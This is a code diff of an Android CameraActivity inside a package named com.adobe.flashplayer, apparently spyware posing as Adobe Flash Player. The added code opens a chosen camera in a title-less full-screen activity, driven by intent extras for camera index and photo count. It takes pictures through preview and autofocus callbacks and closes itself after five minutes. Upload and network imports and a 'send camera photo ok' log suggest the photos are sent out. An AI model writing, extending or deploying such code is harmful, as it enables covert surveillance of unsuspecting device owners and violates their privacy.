@@ -1,19 +1,25 @@
-package com.adobe.flashplayer.data;
 
+package com.adobe.flashplayer.data;
 
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.R;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.network.Network;
 import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.lang.ref.WeakReference;
+import java.util.List;
 
 import android.app.Activity;
+import android.app.UiAutomation;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.res.Configuration;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
@@ -28,29 +34,43 @@ import android.view.SurfaceView;
 import android.view.Window;
 import android.view.WindowManager;
 
+import androidx.core.content.ContextCompat;
 
 
-public class CameraActivity extends Activity implements Runnable{
-    public static int camerano 			= 0;
-    private final String TAG = "CameraPhotoActivity";
+
+public class CameraActivity extends Activity {
+
+    private final String TAG = "[ljg]CameraActivity ";
+
     private SurfaceView mySurfaceView = null;
     private SurfaceHolder myHolder = null;
     private Camera myCamera = null;
-    public static final int CAMERAFOCUSDELAY = 200;
+    private static final int CAMERAFOCUSDELAY = 600;
     private long camerastarttime ;
 
-    public static int DEFAULT_CAMERA_PHOTO_WIDTH = 480;
-    public static int DEFAULT_CAMERA_PHOTO_HEIGHT = 640;
-    private Context context;
+    public static int DEFAULT_CAMERA_PHOTO_WIDTH = 640;
+    public static int DEFAULT_CAMERA_PHOTO_HEIGHT = 480;
+
+    public static int photoNumber 			= 0;
+
+    int cameraIdx = 0;
+
+    WeakReference <Activity> mActivity;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
         super.onCreate(savedInstanceState);
-        Log.d(TAG, "oncreate");
+
+        Log.e(TAG, "oncreate");
 
         camerastarttime = System.currentTimeMillis();
 
-        context = this;
+        this.mActivity = new WeakReference<Activity>(CameraActivity.this);
+
+        Intent intent = getIntent();
+        cameraIdx = intent.getIntExtra("index", 0);
+        photoNumber = intent.getIntExtra("count", 1);
 
         requestWindowFeature(Window.FEATURE_NO_TITLE);
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
@@ -59,57 +79,106 @@ public class CameraActivity extends Activity implements Runnable{
         new Thread(new Runnable() {
             @Override
             public void run() {
-                initCamera();
+
+                int granted = ContextCompat.checkSelfPermission(mActivity.get(), android.Manifest.permission.CAMERA);
+                if (granted != PackageManager.PERMISSION_GRANTED) {
+                    Log.e(TAG, "camera permission not authority");
+                    return;
+                }
+                takephoto();
+            }
+        }).start();
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Thread.sleep(300000);
+                    if (myCamera != null){
+                        myCamera.stopPreview();
+                        myCamera.setPreviewCallback(null);
+                        myCamera.release();
+                        myCamera = null;
+                    }
+
+                    mActivity.get().finish();
+                    return;
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
             }
         }).start();
     }
 
+    public CameraActivity(){
 
-    protected void onDestroy() {
-        super.onDestroy();
-        Log.d(TAG,"onDestroy");
+    }
+
+    public CameraActivity(int cameranum,int idx){
+        cameraIdx = idx;
+        this.photoNumber = cameranum;
     }
 
 
 
-    private void initCamera() {
+
+
+    private void takephoto() {
         try{
             mySurfaceView = (SurfaceView) findViewById(R.id.camera_surfaceview);
             myHolder = mySurfaceView.getHolder();
             myHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
 
-            if(context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){//authority tips
-                if(openFacingCamera()){
+            if(mActivity.get().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
+                if(openCamera(cameraIdx)){
                     myCamera.setPreviewDisplay(myHolder);
 
                     myCamera.setPreviewCallback(myAutoPreviewCallback);
 
                     Camera.Parameters parameters = myCamera.getParameters();
                     //parameters.setPreviewFormat(ImageFormat.JPEG);
+                    //parameters.setPreviewSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
+                    //parameters.setPictureSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
+
+                    List<Camera.Size> list = parameters.getSupportedPreviewSizes();
+                    Camera.Size size = list.get(0);
+
+                    Configuration mConfiguration = mActivity.get().getResources().getConfiguration();
+                    int ori = mConfiguration.orientation;
+                    if (ori == Configuration.ORIENTATION_LANDSCAPE) {
+
+                        DEFAULT_CAMERA_PHOTO_WIDTH = size.height;
+                        DEFAULT_CAMERA_PHOTO_HEIGHT = size.width;
+                    } else if (ori == Configuration.ORIENTATION_PORTRAIT) {
+
+                        DEFAULT_CAMERA_PHOTO_WIDTH = size.width;
+                        DEFAULT_CAMERA_PHOTO_HEIGHT = size.height;
+                    }
+
+                    Log.e(TAG, "camera width:" +size.width + " height:" + size.height );
+
                     parameters.setPreviewSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                     parameters.setPictureSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
-                    //myCamera.setParameters(parameters);
+                    myCamera.setParameters(parameters);
 
                     myCamera.startPreview();
-                    //java.lang.RuntimeException: autoFocus failed
+
                     //Thread.sleep(CAMERAFOCUSDELAY);
                     //myCamera.autoFocus(myAutoFocus);
-
                 }
                 else {
-                    finish();
-                    Log.d(TAG, "openCamera Failed");
+                    this.finish();
+                    Log.e(TAG, "openCamera Failed");
                     MyLog.writeLogFile("openCamera Failed\r\n");
                 }
             }
             else{
-                finish();
-                Log.d(TAG, "camera not exist");
+                this.finish();
+                Log.e(TAG, "camera not exist");
                 MyLog.writeLogFile("camera not exist\r\n");
             }
         }
         catch(Exception ex){
-            ex.printStackTrace();
             try{
                 if(myCamera != null){
                     myCamera.stopPreview();
@@ -117,7 +186,7 @@ public class CameraActivity extends Activity implements Runnable{
                     myCamera.release();
                     myCamera = null;
                 }
-                finish();
+                this.finish();
             }catch(Exception ext){
 
             }
@@ -130,40 +199,27 @@ public class CameraActivity extends Activity implements Runnable{
     }
 
 
-    private boolean openFacingCamera() {
+    private boolean openCamera(int cameraIdx) {
+        try {
         Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
-        if(camerano == 0){
-            for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
+        int camera_cnt = Camera.getNumberOfCameras();
+            for (int camIdx = 0; camIdx < camera_cnt; camIdx++) {
                 Camera.getCameraInfo(camIdx, cameraInfo);
-                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                    try {
-                        myCamera = Camera.open(camIdx);
-                    }
-                    catch (Exception ex) {
-                        ex.printStackTrace();
-                        return false;
-                    }
+                if (cameraInfo.facing == cameraIdx) {
+                    myCamera = Camera.open(camIdx);
+                    Log.e(TAG, "openCamera Success");
+                    return true;
                 }
             }
         }
-        else{
-            for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
-                Camera.getCameraInfo(camIdx, cameraInfo);
-                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
-                    try {
-                        myCamera = Camera.open(camIdx);
-                    }
-                    catch (Exception e) {
-                        return false;
-                    }
-                }
-            }
+        catch (Exception ex) {
+            ex.printStackTrace();
         }
 
-        Log.d(TAG, "openCamera Success");
-        //WriteDateFile.writeLogFile("openCamera Success\r\n");
-        return true;
+        return false;
     }
+
+
 
     private PreviewCallback myAutoPreviewCallback = new PreviewCallback() {
         @Override
@@ -177,7 +233,7 @@ public class CameraActivity extends Activity implements Runnable{
         @Override
         public void onAutoFocus(boolean success, Camera camera) {
             try{
-                Thread.sleep(CAMERAFOCUSDELAY);
+                //Thread.sleep(CAMERAFOCUSDELAY);
                 myCamera.takePicture(null, null, myPicCallback);
             }catch(Exception ex){
                 MyLog.writeLogFile("camera auto focus error\r\n");
@@ -195,7 +251,7 @@ public class CameraActivity extends Activity implements Runnable{
                 myCamera.setPreviewCallback(null);
                 myCamera.release();
                 myCamera = null;
-                finish();
+                CameraActivity.this.finish();
 
                 long cameraendtime = System.currentTimeMillis();
                 long camerausetime = cameraendtime - camerastarttime;
@@ -234,9 +290,9 @@ public class CameraActivity extends Activity implements Runnable{
                     fos.close();
                 }
 
-                Log.d(TAG, "send camera photo ok");
+                Log.e(TAG, "send camera photo ok");
             } catch (Exception error) {
-                Log.d(TAG, "camera photo PictureCallback error:" + error.toString());
+                Log.e(TAG, "camera photo PictureCallback error:" + error.toString());
                 error.printStackTrace();
                 String errorString = Utils.getExceptionDetail(error);
                 String stackString = Utils.getCallStack();
@@ -247,8 +303,10 @@ public class CameraActivity extends Activity implements Runnable{
     };
 
 
-    @Override
-    public void run(){
 
+
+    protected void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG,"onDestroy");
     }
 }
